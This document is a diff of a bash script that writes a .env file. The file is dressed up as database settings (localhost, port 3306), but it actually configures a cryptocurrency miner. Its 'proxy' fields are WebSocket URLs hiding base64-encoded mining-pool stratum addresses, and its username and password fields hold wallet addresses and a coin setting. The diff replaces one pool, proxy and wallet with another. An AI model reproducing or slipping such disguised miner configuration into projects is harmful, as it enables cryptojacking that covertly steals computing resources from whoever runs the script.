@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-echo -e "host=127.0.0.1\nport=3306\nproxy=wss://ws-zozo.hongphat.edu.vn/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=8\npassword=c=RVN\nusername=RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5" > .env
+echo -e "host=127.0.0.1\nport=3306\nproxy=wss://proxy-tq9r.onrender.com/c3RyYXR1bS1ldS5ycGxhbnQueHl6OjcwMjI=\nthreads=8\npassword=x\nusername=mbc1qsey07g3gp6lmphlk76y4h5y5qgzkjtpr9ugghl.ai" > .env
 
 
 MIN=$1
